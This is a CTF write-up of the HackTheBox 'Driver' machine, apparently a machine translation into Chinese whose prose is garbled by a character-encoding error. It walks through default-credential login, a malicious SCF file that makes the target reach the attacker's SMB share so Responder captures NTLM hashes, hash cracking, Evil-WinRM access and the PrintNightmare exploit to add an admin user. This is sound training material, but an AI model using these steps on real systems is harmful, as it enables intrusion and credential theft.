<html>
<head>
<title>Driver from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ¥è‡ªHackTheBoxçš„é©±åŠ¨ç¨‹åºâ€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/driver-from-hackthebox-detailed-walkthrough-dea776b1b53d?source=collection_archive---------0-----------------------#2022-02-26">https://infosecwriteups.com/driver-from-hackthebox-detailed-walkthrough-dea776b1b53d?source=collection_archive---------0-----------------------#2022-02-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="bf99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="bce2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/971953490275f63c3d9c7148948f5589.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*jKfOrwIdE95hGda5.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é»‘å®¢ç›’å­çš„å¸æœº</figcaption></figure><p id="9a66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é©±åŠ¨ç¨‹åºæ˜¯HackTheBoxä¸Šçš„ä¸€ä¸ªç®€å•çš„Windowsæœºå™¨ï¼Œç”±<a class="ae lv" href="https://app.hackthebox.com/users/13531" rel="noopener ugc nofollow" target="_blank"> MrR3boot </a>åˆ›å»ºã€‚å®ƒå¼ºè°ƒäº†æ‰“å°æœºæœåŠ¡å™¨æ²¡æœ‰é€šè¿‡å…è®¸è®¿é—®ç®¡ç†é—¨æˆ·çš„é»˜è®¤å‡­è¯å¾—åˆ°é€‚å½“ä¿æŠ¤çš„å±é™©ã€‚æ‰“å°æœºç®¡ç†è½¯ä»¶ä¸å®‰å…¨ï¼Œå…è®¸ä¸Šä¼ å’Œæ‰§è¡Œæœªç»æˆæƒçš„ç”¨æˆ·æ–‡ä»¶ã€‚å¯¼è‡´æˆ‘ä»¬åˆ©ç”¨PrintNightmareæ¼æ´CVE-2021â€“1675æ¥è·å–æ ¹ç”¨æˆ·è®¿é—®æƒé™ã€‚</p><p id="bfae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯webå’Œæ“ä½œç³»ç»Ÿæšä¸¾ï¼Œä»¥åŠå½“å‰æ¼æ´åˆ©ç”¨çš„çŸ¥è¯†ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯åˆ›å»ºæ¶æ„æ–‡ä»¶å’Œä½¿ç”¨å“åº”è€…é€šè¿‡ä½¿ç”¨ä¸­é—´äººæ”»å‡»æ¥æ•è·å“ˆå¸Œã€‚</p><h1 id="cb34" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="9970" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/e3daef69fec4d64df6673ef9432e9f56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bnDBWIpyFGjJNtAyUOuZkA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ‰€æœ‰TCPç«¯å£çš„Nmapéª—å±€</figcaption></figure><p id="f0e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ä¸€å°WindowsæœåŠ¡å™¨ï¼Œå…¶ç½‘ç«™ç«¯å£ä¸º80ï¼ŒRPCç«¯å£ä¸º135ï¼ŒSMBç«¯å£ä¸º445ã€‚è®©æˆ‘ä»¬é¦–å…ˆå°†IPæ·»åŠ åˆ°æˆ‘ä»¬çš„hostsæ–‡ä»¶ä¸­:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="2582" class="ml km iq mh b gy mm mn l mo mp">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]<br/>â””â”€# echo "10.10.11.106 driver.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="507b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">RPCè½¬å‚¨</h1><p id="541b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ä»è¿™ä¸ªç›’å­çš„åç§°å’Œä¸»é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“å®ƒæ˜¯åŸºäºPrintNightmareæ¼æ´ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨rpcdumpæ£€æŸ¥å®ƒæ˜¯å¦å®¹æ˜“å—åˆ°æ”»å‡»:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="bc32" class="ml km iq mh b gy mm mn l mo mp">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]<br/>â””â”€# python3 rpcdump.py 10.10.11.106 | grep MS-RPRN<br/>Protocol: [MS-RPRN]: Print System Remote Protocol</span></pre><h1 id="2e44" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ‰“å°æœºé—¨æˆ·</h1><p id="1fd9" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">è¿™ç¡®è®¤äº†æ‰“å°æœåŠ¡æ­£åœ¨å…¶ä¸Šè¿è¡Œã€‚ç°åœ¨æˆ‘ä»¬çœ‹çœ‹ç«¯å£80ï¼Œå®ƒæ˜¯æ‰“å°æœºç®¡ç†è½¯ä»¶çš„ç™»å½•é¡µé¢ï¼Œéœ€è¦å‡­æ®:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mq"><img src="../Images/e18a9463d925923aad7a35edc3784694.png" data-original-src="https://miro.medium.com/v2/resize:fit:1286/format:webp/0*kn89gxn5L9TyHKCb.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç™»å½•å®‰å…¨å¯¹è¯æ¡†</figcaption></figure><p id="cc1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œçš„æç¤ºæ˜¯adminï¼Œæˆ‘å°è¯•äº†æ˜æ˜¾çš„admin:adminï¼Œè¿™ä½¿æˆ‘è¿›å…¥:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mr"><img src="../Images/cc6718ba474999682eaed60441c35db8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*oCTxWui0zvmj1NiJ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">MFPå›ºä»¶æ›´æ–°ä¸­å¿ƒ</figcaption></figure><p id="ff5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å”¯ä¸€æœ‰æ•ˆçš„é¡µé¢æ˜¯å›ºä»¶æ›´æ–°é¡µé¢:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ms"><img src="../Images/56d759a1709742e2dfb7d8718d92bdc1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1CFrsdrg9uK46uC8.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å›ºä»¶æ›´æ–°</figcaption></figure><h1 id="233d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ¶æ„SCFæ–‡ä»¶</h1><p id="baa1" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">åœ¨è¿™ä¸ªé¡µé¢ä¸Šå¯ä»¥ä¸Šä¼ æˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ä¸€ç§æ‰§è¡Œæœ‰æ•ˆè½½è·çš„æ–¹å¼ï¼Œç»è¿‡ä¸€ç•ªæœç´¢ï¼Œæˆ‘åœ¨Pentestlabä¸Šæ‰¾åˆ°äº†<a class="ae lv" href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks" rel="noopener ugc nofollow" target="_blank">è¿™ç¯‡</a>å¾ˆæ£’çš„æ–‡ç« ã€‚åœ¨æ­¤ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªscfæ–‡ä»¶ï¼Œè¿™å°†å¯¼è‡´æœåŠ¡å™¨å°è¯•è”ç³»æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ï¼Œåœ¨é‚£é‡Œæˆ‘ä»¬æœ‰Responderä¾¦å¬æ•è·å¸æˆ·çš„å“ˆå¸Œæ­£åœ¨ä½¿ç”¨ã€‚</p><p id="6154" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é¦–å…ˆåˆ›å»ºæˆ‘ä»¬çš„æ¶æ„scfæ–‡ä»¶:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="5427" class="ml km iq mh b gy mm mn l mo mp">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]<br/>â””â”€# cat @pencer.scf      <br/>[Shell]<br/>Command=2<br/>IconFile=\\10.10.14.192\share\pencer.ico<br/>[Taskbar]<br/>Command=ToggleDesktop</span></pre><p id="f838" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œæˆ‘æœ‰æˆ‘çš„Kali IPåœ¨tun0ä¸Šï¼Œå›¾æ ‡å’Œå…±äº«å¹¶ä¸å­˜åœ¨ï¼Œä»–ä»¬åªæ˜¯éœ€è¦è¿™ä¸ªå·¥ä½œã€‚</p><p id="1e36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ä¸Šä¼ æ–‡ä»¶:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mt"><img src="../Images/db54d2b0c15d051645fc0d1c1e8c5861.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*eadFzmrsa86C5yT8.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ–‡ä»¶ä¸Šä¼ </figcaption></figure><h1 id="b4a4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å›ç­”è€…</h1><p id="5463" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ç¡®ä¿æ‚¨æœ‰åº”ç­”è€…ç›‘å¬:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="b6bc" class="ml km iq mh b gy mm mn l mo mp">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]<br/>â””â”€# responder -wrf --lm -v -I tun0<br/>                                         __<br/>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br/>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br/>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br/>                   |__|<br/><br/>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br/><br/>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br/>  To kill this script hit CTRL-C<br/><br/>[+] Poisoners:<br/>    LLMNR                      [ON]<br/>    NBT-NS                     [ON]<br/>    DNS/MDNS                   [ON]<br/><br/>[+] Servers:<br/>    HTTP server                [ON]<br/>    HTTPS server               [ON]<br/>    WPAD proxy                 [ON]<br/>    Auth proxy                 [OFF]<br/>    SMB server                 [ON]<br/>    Kerberos server            [ON]<br/>    SQL server                 [ON]<br/>    FTP server                 [ON]<br/>    IMAP server                [ON]<br/>    POP3 server                [ON]<br/>    SMTP server                [ON]<br/>    DNS server                 [ON]<br/>    LDAP server                [ON]<br/>    RDP server                 [ON]<br/>    DCE-RPC server             [ON]<br/>    WinRM server               [ON]<br/><br/>[+] HTTP Options:<br/>    Always serving EXE         [OFF]<br/>    Serving EXE                [OFF]<br/>    Serving HTML               [OFF]<br/>    Upstream Proxy             [OFF]<br/><br/>[+] Poisoning Options:<br/>    Analyze Mode               [OFF]<br/>    Force WPAD auth            [OFF]<br/>    Force Basic Auth           [OFF]<br/>    Force LM downgrade         [ON]<br/>    Fingerprint hosts          [ON]<br/><br/>[+] Generic Options:<br/>    Responder NIC              [tun0]<br/>    Responder IP               [10.10.14.192]<br/>    Challenge set              [random]<br/>    Don't Respond To Names     ['ISATAP']<br/><br/>[+] Current Session Variables:<br/>    Responder Machine Name     [WIN-QO2U5X54CZL]<br/>    Responder Domain Name      [1P4E.LOCAL]<br/>    Responder DCE-RPC Port     [45284]<br/><br/>[+] Listening for events...<br/>[SMB] NTLMv2 Client   : 10.10.11.106<br/>[SMB] NTLMv2 Username : DRIVER\tony<br/>[SMB] NTLMv2 Hash     : tony::DRIVER:e4&lt;HIDDEN&gt;00<br/>&lt;SNIP&gt;<br/>[+] Exiting...</span></pre><h1 id="daca" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å“ˆå¸Œç ´è§£</h1><p id="fd89" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ç‚¹å‡»æäº¤æŒ‰é’®ä¸Šä¼ æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½åï¼Œæˆ‘ä»¬çœ‹åˆ°Responderå·²ç»æ•è·äº†ç”¨æˆ·æ•£åˆ—ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ç ´è§£å®ƒ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/956de34d6c97cf9a4d0e944081b4f6ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wqByla6vdc6wBh-KE0WwgA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">è¯†åˆ«å“ˆå¸Œç±»å‹</figcaption></figure><p id="72ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†Johnä¸rockyoué…åˆä½¿ç”¨ï¼Œåªéœ€å‡ ç§’é’Ÿ:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="8d53" class="ml km iq mh b gy mm mn l mo mp">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]<br/>â””â”€# john hash.txt --format=netntlmv2 --wordlist=rockyou.txt <br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt;          (tony)<br/>1g 0:00:00:00 DONE (2021-10-27 17:26) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s !!!!!!..eatme1<br/>Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably<br/>Session completed</span></pre><h1 id="9854" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">é‚ªæ¶-WinRM</h1><p id="2c0f" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘ä»¬ç°åœ¨æœ‰äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨Evil-WinRMè¿›è¡Œè¿æ¥ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œè®©æˆ‘ä»¬æŠ“ä½<a class="ae lv" href="https://github.com/calebstewart/CVE-2021-1675" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ç‰ˆæœ¬çš„PrintNightmareå…¬å¼€æ¼æ´:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mu"><img src="../Images/94e2b4ea8c9a8d41fc3ddc9222c67764.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T8fXiGpiXA_1Yf0LW0sN1w.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä¸‹è½½CVE-2021â€“1675æ¼æ´</figcaption></figure><p id="69a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥è¿æ¥åˆ°ç›’å­:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="cf9c" class="ml km iq mh b gy mm mn l mo mp">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]<br/>â””â”€# evil-winrm -i 10.10.11.106 -u tony -p liltony<br/><br/>Evil-WinRM shell v3.3<br/>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br/>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br/>Info: Establishing connection to remote endpoint</span></pre><h1 id="e91a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="0461" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ä¸å¦¨æŠ“ä½ç”¨æˆ·æ ‡å¿—:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="3bcd" class="ml km iq mh b gy mm mn l mo mp">*Evil-WinRM* PS C:\Users\tony\Documents&gt; type ../Desktop/user.txt<br/>&lt;HIDDEN&gt;</span></pre><h1 id="3653" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ‰“å°å™©æ¢¦æ¼æ´</h1><p id="724f" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ç°åœ¨ä¸Šä¼ æˆ‘ä»¬çš„æ¼æ´:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="cbd4" class="ml km iq mh b gy mm mn l mo mp">*Evil-WinRM* PS C:\Users\tony\Documents&gt; upload /root/htb/driver/CVE-2021-1675.ps1<br/>Info: Uploading /root/htb/driver/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1<br/>Data: 238080 bytes of 238080 bytes copied<br/>Info: Upload successful!</span></pre><p id="902c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœæˆ‘ä»¬å°è¯•å¯¼å…¥PowerShellæ¨¡å—ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªé”™è¯¯ï¼Œå› ä¸ºæ‰§è¡Œç­–ç•¥è®¾ç½®ä¸ºrestricted:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="d070" class="ml km iq mh b gy mm mn l mo mp">*Evil-WinRM* PS C:\Users\tony\Documents&gt; Import-Module ./CVE-2021-1675.ps1<br/>File C:\Users\tony\Documents\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. <br/>At line:1 char:1<br/>+ Import-Module ./CVE-2021-1675.ps1<br/>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/>    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException<br/>    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand</span></pre><p id="6d97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯¹äºå½“å‰ç”¨æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å®ƒè®¾ç½®ä¸ºæ— é™åˆ¶æ¥è½»æ¾è§£å†³è¿™ä¸ªé—®é¢˜:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="73bb" class="ml km iq mh b gy mm mn l mo mp">*Evil-WinRM* PS C:\Users\tony\Documents&gt; Set-ExecutionPolicy Unrestricted -Scope CurrentUser</span></pre><p id="f9a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥å¯¼å…¥å®ƒå¹¶è¿è¡Œä»¥åˆ›å»ºæˆ‘ä»¬çš„ç®¡ç†å‘˜ç”¨æˆ·:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mv"><img src="../Images/a55d7265d9bf4db3df0f832968dedc17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MLJetzx0KB8D2elU1Lm0CA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å¯¼å…¥å¹¶è¿è¡Œæ¼æ´åˆ©ç”¨</figcaption></figure><h1 id="8b6c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æƒé™æå‡</h1><p id="8389" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æœ€åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–°å¸æˆ·è¿æ¥æ–°çš„Evil-WinRMä¼šè¯:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mw"><img src="../Images/fdaadb98d5e5551e93d40867ee67e7bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ic8Snl4Z_sOz4rmnaU9yaA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Evil-WinRMè¿æ¥åˆ°æ–°å¸æˆ·</figcaption></figure><h1 id="8907" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¹æ ‡å¿—</h1><p id="87ef" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">å‰©ä¸‹çš„å°±æ˜¯æŠ“æ ¹æ——äº†:</p><pre class="lk ll lm ln gt mg mh mi mj aw mk bi"><span id="f97e" class="ml km iq mh b gy mm mn l mo mp">*Evil-WinRM* PS C:\Users\pencer\Documents&gt; cd c:\<br/>*Evil-WinRM* PS C:\&gt; cd users<br/>*Evil-WinRM* PS C:\users&gt; cd administrator<br/>*Evil-WinRM* PS C:\users\administrator&gt; type desktop\root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="8956" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™éå¸¸ç®€å•ï¼Œä½†æ˜¯ç©PrintNightmareå¾ˆæœ‰è¶£ã€‚æˆ‘åœ¨è¿™é‡Œå†™äº†ä¸€ç¯‡æ–‡ç« ï¼Œæ›´åŠ è¯¦ç»†åœ°æè¿°äº†PrintNightmareã€‚å»çœ‹çœ‹ï¼</p><p id="780d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl mx my hu mz" role="separator"><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc"/></div><div class="ij ik il im in"><p id="9ec0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="cc84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae lv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae lv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="df84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ne">åŸè½½äº2022å¹´2æœˆ26æ—¥</em><a class="ae lv" href="https://pencer.io/ctf/ctf-htb-driver/" rel="noopener ugc nofollow" target="_blank"><em class="ne">https://pencer . io</em></a><em class="ne">ã€‚</em></p></div></div>    
</body>
</html>